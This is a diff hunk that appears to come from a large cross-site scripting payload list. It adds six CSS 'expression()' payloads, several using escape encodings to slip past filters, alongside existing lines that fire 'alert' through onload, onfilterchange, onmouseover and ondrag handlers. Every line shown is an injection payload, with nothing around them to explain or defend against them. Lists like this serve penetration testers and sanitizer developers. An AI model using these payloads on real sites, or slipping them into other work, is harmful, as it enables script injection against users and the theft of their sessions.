@@ -2923,6 +2923,12 @@ ${alert(1)}
 <div style=content:url(data:image/svg+xml,%3Csvg/%3E);visibility:hidden onload=alert(41)></div>//["'`-->]]>]</div>
 <div style=content:url(test2.svg)></div>
 <div style=width:1px;filter:glow onfilterchange=javascript:alert(1)>x
+<div style=xss:expressio&#x5c;6e(alert(1))>
+<div style=xss:expressio\00006e(alert(1))>
+<div style=xss:expressio\006e(alert(1))>
+<div style=xss:expressio\6e(alert(1))>
+<div style=xss:expression(1)-alert(1)>
+<div style=xss:expression(alert(1))>
 <div/onmouseover='alert(1)'> style="x:">
 <div/style="width:expression(confirm(1))">X</div> {IE7}
 <dl draggable="true" ondrag="alert(1)">test</dl>
